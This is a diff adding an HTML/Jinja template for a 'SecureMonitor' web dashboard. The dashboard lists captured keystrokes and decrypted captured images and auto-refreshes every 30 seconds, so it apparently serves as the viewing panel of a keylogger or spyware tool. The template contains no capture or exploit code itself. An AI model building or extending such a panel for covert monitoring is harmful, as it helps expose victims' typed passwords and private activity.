@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Monitoring Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='modern.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="dashboard">
+        <aside class="sidebar">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <span>SecureMonitor</span>
+            </div>
+            <nav class="nav-menu">
+                <div class="theme-controls">
+                    <button class="btn btn-icon" onclick="setTheme('light')" title="Light Theme">
+                        <i class="fas fa-sun"></i>
+                    </button>
+                    <button class="btn btn-icon" onclick="setTheme('dark')" title="Dark Theme">
+                        <i class="fas fa-moon"></i>
+                    </button>
+                </div>
+            </nav>
+        </aside>
+
+        <main class="main-content">
+            <div class="header">
+                <h1>Monitoring Dashboard</h1>
+                <div class="controls">
+                    <div class="live-indicator">
+                        <div class="live-dot"></div>
+                        Live
+                    </div>
+                    <button class="btn btn-primary" onclick="location.reload()">
+                        <i class="fas fa-sync-alt"></i>
+                        Refresh Data
+                    </button>
+                </div>
+            </div>
+
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-value">{{ keylog_entries|length }}</div>
+                    <div class="stat-label">Keylog Entries</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">{{ image_paths|length }}</div>
+                    <div class="stat-label">Captured Images</div>
+                </div>
+            </div>
+
+            <div class="grid">
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">
+                            <i class="fas fa-keyboard"></i>
+                            Recent Keystrokes
+                        </h2>
+                    </div>
+                    <div class="keylog-container">
+                        {% if keylog_entries %}
+                            {% for entry in keylog_entries %}
+                                <div class="keylog-entry">
+                                    <span class="entry-content">{{ entry }}</span>
+                                </div>
+                            {% endfor %}
+                        {% else %}
+                            <div class="empty-state">
+                                <i class="fas fa-keyboard"></i>
+                                <p>No keylog entries available</p>
+                            </div>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">
+                        <i class="fas fa-camera"></i>
+                        Captured Images
+                    </h2>
+                </div>
+                <div class="image-grid">
+                    {% if image_paths %}
+                        {% for image_path in image_paths %}
+                            <div class="image-card">
+                                <img src="{{ url_for('decrypt_image', image_path=image_path) }}" 
+                                     alt="Captured Image"
+                                     loading="lazy"
+                                     onerror="this.src='{{ url_for('static', filename='error.png') }}'">
+                                <div class="image-info">
+                                    {% set timestamp = image_path.split('_')[-1].replace('.png', '') %}
+                                    <div class="timestamp">
+                                        <i class="far fa-clock"></i> 
+                                        {{ timestamp }}
+                                    </div>
+                                </div>
+                            </div>
+                        {% endfor %}
+                    {% else %}
+                        <div class="empty-state">
+                            <i class="fas fa-camera"></i>
+                            <p>No captured images available</p>
+                        </div>
+                    {% endif %}
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Theme management
+        function setTheme(theme) {
+            document.body.setAttribute('data-theme', theme);
+            localStorage.setItem('preferred-theme', theme);
+        }
+
+        // Load saved theme
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedTheme = localStorage.getItem('preferred-theme') || 'light';
+            setTheme(savedTheme);
+        });
+
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            location.reload();
+        }, 30000);
+    </script>
+</body>
+</html>
